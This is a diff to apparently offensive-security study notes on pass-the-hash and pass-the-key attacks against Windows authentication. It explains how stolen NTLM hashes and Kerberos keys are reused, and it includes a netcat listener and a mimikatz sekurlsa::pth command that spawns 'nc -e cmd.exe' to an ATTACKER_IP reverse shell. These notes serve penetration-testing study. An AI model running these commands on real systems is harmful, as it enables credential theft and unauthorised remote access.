@@ -20,17 +20,18 @@ Now, when we start a new command prompt session, we can verify that the injected
 
 **a. Using stolen NTLM hash with NetNTLM authentication**
 
-* When we receive a challenge from the remote server, the injected NTLM hash will be used to create the challenge response&#x20;
-
-
+1. When we receive a challenge from the remote server, the injected NTLM hash will be used to create the challenge response&#x20;
+2. Since we are using the NTLM hash of the target user, we can authenticate as that particular user
 
 **b. Using stolen encryption key with Kerberos authentication**
 
-
+1. Given that we have extracted the Kerberos encryption key, it can be used to encrypt the timestamp that is required for the **TGT** request
+2. The **KDC** will then respond with the **TGT** and a **Session Key**
+3. Subsequently, we can use the retrieved values to request for a **TGS** as the user stored in the Kerberos encryption key in the first step
 
 #### Example
 
-Suppose we have found a user's NTLM hash using the `lsadump::sam` or `sekurlsa::msv` methods. We can use the found hash to retrieve a shell session as the found user.
+Suppose we have found a user's NTLM hash using the `lsadump::sam` or `sekurlsa::msv` methods. We can use the found hash to retrieve a logon session as the user.
 
 First, we need to establish a listener to catch the shell:
 
@@ -38,13 +39,15 @@ First, we need to establish a listener to catch the shell:
 $ nc -lvnp PORT
 ```
 
-Next, perform the attack:
+Next, perform PtH:
 
 {% code overflow="wrap" %}
 ```
-mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:"nc -e cmd.exe ATTACKER_IP PORT" 
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /<xxxx>:<hash> /run:"nc -e cmd.exe ATTACKER_IP PORT" 
 ```
 {% endcode %}
+
+From the shell session established:
 
 Note that if we execute the `whoami` command, we will still see the original user we were using before performing the attack, but any commands executed from this session will use the injected credentials.
 
